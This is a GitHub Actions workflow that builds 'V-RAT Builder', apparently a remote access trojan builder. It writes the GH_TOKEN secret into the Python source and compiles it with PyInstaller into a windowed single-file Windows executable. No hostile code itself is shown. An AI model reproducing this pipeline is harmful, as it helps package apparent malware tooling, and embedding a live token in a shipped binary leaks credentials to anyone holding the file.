name: Build V-RAT Builder

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout
      uses: actions/checkout@v4
    
    - name: Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.10'
        architecture: 'x86'
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install pyinstaller requests
    
    - name: Replace token in code
      run: |
        $content = Get-Content vrat_builder.py -Raw
        $content = $content -replace "##GITHUB_TOKEN_PLACEHOLDER##", "${{ secrets.GH_TOKEN }}"
        $content | Out-File vrat_builder.py -Encoding UTF8
    
    - name: Build EXE (x86)
      run: |
        pyinstaller --onefile --windowed --name V-RAT_Builder --target-architecture x86 vrat_builder.py
    
    - name: Upload artifact
      uses: actions/upload-artifact@v4
      with:
        name: V-RAT_Builder_x86
        path: dist/V-RAT_Builder.exe
        compression-level: 0
        if-no-files-found: error
